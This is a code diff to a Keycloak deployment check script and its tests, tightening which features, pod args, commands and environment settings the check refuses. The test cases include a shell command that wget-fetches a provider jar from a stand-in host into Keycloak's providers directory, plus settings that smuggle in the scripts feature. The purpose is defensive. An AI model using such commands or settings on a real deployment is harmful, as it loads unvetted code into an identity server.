@@ -348,26 +348,40 @@ const overlays = fs.readdirSync(path.join(root, "deploy/kustomize/overlays"));
 // write any claim, aud included. check-realm.mjs refuses every mapper that is
 // not on its list of stock Keycloak 26.7.5 mappers; this keeps the deployment
 // from loading other mappers at all. The CR runs the stock image
-// quay.io/keycloak/keycloak:26.7.5 (no provider jars) with neither the scripts
-// feature nor legacy token exchange (token-exchange, v1; preview enables both),
-// and nothing is mounted at /opt/keycloak/providers. Features are read from
-// spec.features only, so features set as an additional option or KC_FEATURES*
-// env var are refused, and the pod template may not replace the image.
+// quay.io/keycloak/keycloak:26.7.5 (no provider jars), enables no feature but
+// the allow-listed ones (ENABLED_FEATURES: not scripts, preview, legacy
+// token-exchange, token-exchange-delegation, jwt-authorization-grant or any
+// other feature that adds mappers, grants or token exchange), and nothing is
+// mounted at /opt/keycloak/providers. Features are read from spec.features
+// only, so features set as an additional option, a KC_FEATURES* env var, a
+// KCKEY_* env var naming the features option or a -Dkc.features system
+// property are refused; the Keycloak container (the first pod template
+// container) takes no args, command or envFrom, because the operator keeps
+// non-empty args (it sets "--verbose start" only when they are empty) and
+// both can set features or fetch a provider jar. The pod template may not
+// replace the image.
 const STOCK_IMAGE = "quay.io/keycloak/keycloak:26.7.5";
 const PROVIDERS_DIR = "/opt/keycloak/providers";
-const REFUSED_FEATURES = /^(scripts|preview|token-exchange)(:v\d+)?$/;
+const ENABLED_FEATURES = /^token-exchange-standard(:v\d+)?$/;
 function providerProblems(kc) {
   const problems = [];
   if (kc?.spec?.image !== STOCK_IMAGE) problems.push(`spec.image must be ${STOCK_IMAGE}, found ${JSON.stringify(kc?.spec?.image)}`);
   for (const f of kc?.spec?.features?.enabled || []) {
-    if (REFUSED_FEATURES.test(String(f).trim().toLowerCase())) problems.push(`spec.features.enabled must not enable ${f} (script mappers or legacy token exchange)`);
+    if (!ENABLED_FEATURES.test(String(f).trim().toLowerCase())) problems.push(`spec.features.enabled must not enable ${f} (only token-exchange-standard may be listed; other features can load script mappers or add grants and token exchange)`);
   }
   for (const o of kc?.spec?.additionalOptions || []) {
     if (`KC_${envForm(o.name)}`.startsWith("KC_FEATURES")) problems.push(`additional option ${o.name} sets features outside spec.features`);
   }
   const pod = kc?.spec?.unsupported?.podTemplate?.spec;
+  const keycloakContainer = pod?.containers?.[0] || {};
+  for (const f of ["args", "command"]) if ((keycloakContainer[f] || []).length) problems.push(`podTemplate containers[0] ${f} can set features or fetch a provider jar into ${PROVIDERS_DIR}`);
+  if (keycloakContainer.envFrom !== undefined) problems.push("podTemplate containers[0] envFrom can set KC_FEATURES, and its variables are not visible to this check");
   for (const [where, c] of [["spec", { env: kc?.spec?.env }], ...(pod?.containers || []).map((c, i) => [`podTemplate containers[${i}]`, c]), ...(pod?.initContainers || []).map((c, i) => [`podTemplate initContainers[${i}]`, c])]) {
-    for (const e of c.env || []) if (envForm(e.name).startsWith("KC_FEATURES")) problems.push(`${where} env ${e.name} sets features outside spec.features`);
+    for (const e of c.env || []) {
+      if (envForm(e.name).startsWith("KC_FEATURES")) problems.push(`${where} env ${e.name} sets features outside spec.features`);
+      if (envForm(e.name).startsWith("KCKEY_") && `KC_${envForm(e.value)}`.startsWith("KC_FEATURES")) problems.push(`${where} env ${e.name} maps KC_${envForm(e.name).slice(6)} to ${e.value}, which sets features outside spec.features`);
+      if (/-Dkc\.features/i.test(String(e.value ?? ""))) problems.push(`${where} env ${e.name} sets features outside spec.features (-Dkc.features)`);
+    }
     if (c.image !== undefined) problems.push(`${where} image ${c.image} would replace or add to the stock image`);
     for (const m of c.volumeMounts || []) {
       if (pathsOverlap(m.mountPath, PROVIDERS_DIR)) problems.push(`${where} mount at ${m.mountPath} reaches ${PROVIDERS_DIR}, where Keycloak loads provider jars`);
@@ -400,7 +414,19 @@ test("the provider check rejects another image, a refused feature and a mount at
     "mount at providers": [withSpec((s) => { podContainer(s).volumeMounts.push({ name: "jars", mountPath: "/opt/keycloak/providers" }); }), /mount at \/opt\/keycloak\/providers reaches/],
     "mount of one jar": [withSpec((s) => { podContainer(s).volumeMounts.push({ name: "jars", mountPath: "/opt/keycloak/providers/aud.jar", subPath: "aud.jar" }); }), /mount at \/opt\/keycloak\/providers\/aud\.jar reaches/],
     "mount over /opt/keycloak": [withSpec((s) => { podContainer(s).volumeMounts.push({ name: "jars", mountPath: "/opt/keycloak/" }); }), /mount at \/opt\/keycloak\/ reaches/],
-    "init container filling providers": [withSpec((s) => { s.unsupported.podTemplate.spec.initContainers = [{ name: "fetch", image: "busybox", volumeMounts: [{ name: "jars", mountPath: "/opt/keycloak/providers" }] }]; }), /initContainers\[0\] mount at \/opt\/keycloak\/providers/]
+    "init container filling providers": [withSpec((s) => { s.unsupported.podTemplate.spec.initContainers = [{ name: "fetch", image: "busybox", volumeMounts: [{ name: "jars", mountPath: "/opt/keycloak/providers" }] }]; }), /initContainers\[0\] mount at \/opt\/keycloak\/providers/],
+    // Features outside the allow-list (Keycloak 26.7.5 Profile$Feature).
+    "jwt-authorization-grant": [withSpec((s) => { s.features.enabled = ["jwt-authorization-grant"]; }), /must not enable jwt-authorization-grant/],
+    "token-exchange-delegation": [withSpec((s) => { s.features.enabled = ["token-exchange-delegation:v1"]; }), /must not enable token-exchange-delegation:v1/],
+    "identity-assertion-jwt": [withSpec((s) => { s.features.enabled = ["identity-assertion-jwt"]; }), /must not enable identity-assertion-jwt/],
+    // The operator keeps non-empty pod template args (it sets "--verbose
+    // start" only when they are empty), so they can enable features.
+    "pod args enabling scripts": [withSpec((s) => { podContainer(s).args = ["start", "--features=scripts"]; }), /podTemplate containers\[0\] args/],
+    "pod command fetching a jar": [withSpec((s) => { podContainer(s).command = ["/bin/sh", "-c", "wget -O /opt/keycloak/providers/aud.jar https://example.invalid/aud.jar && exec /opt/keycloak/bin/kc.sh start"]; }), /podTemplate containers\[0\] command/],
+    "pod envFrom": [withSpec((s) => { podContainer(s).envFrom = [{ configMapRef: { name: "kc-features" } }]; }), /podTemplate containers\[0\] envFrom/],
+    "-Dkc.features in JAVA_OPTS_APPEND": [withSpec((s) => { s.env = [{ name: "JAVA_OPTS_APPEND", value: "-Dkc.features=scripts" }]; }), /spec env JAVA_OPTS_APPEND sets features/],
+    "-Dkc.features in pod JAVA_OPTS": [withSpec((s) => { podContainer(s).env = [{ name: "JAVA_OPTS", value: "-Xmx1g -DKC.FEATURES=scripts" }]; }), /podTemplate containers\[0\] env JAVA_OPTS sets features/],
+    "KCKEY_ env naming features": [withSpec((s) => { s.env = [{ name: "KC_FOO", value: "scripts" }, { name: "KCKEY_FOO", value: "features" }]; }), /spec env KCKEY_FOO maps KC_FOO to features/]
   };
   const missed = [];
   for (const [name, [kc, expected]] of Object.entries(cases)) {
@@ -408,8 +434,9 @@ test("the provider check rejects another image, a refused feature and a mount at
     if (!problems.some((p) => expected.test(p))) missed.push(`${name}: expected a problem matching ${expected}, got ${JSON.stringify(problems)}`);
   }
   assert.deepEqual(missed, []);
-  // Not refused: a feature that is neither scripts nor legacy token exchange.
+  // Not refused: the allow-listed feature, and a KCKEY_ mapping to another option.
   assert.deepEqual(providerProblems(withSpec((s) => { s.features.enabled = ["token-exchange-standard:v2"]; })), []);
+  assert.deepEqual(providerProblems(withSpec((s) => { s.env = [{ name: "KC_FOO", value: "info" }, { name: "KCKEY_FOO", value: "log-level" }]; })), []);
 });
 
 
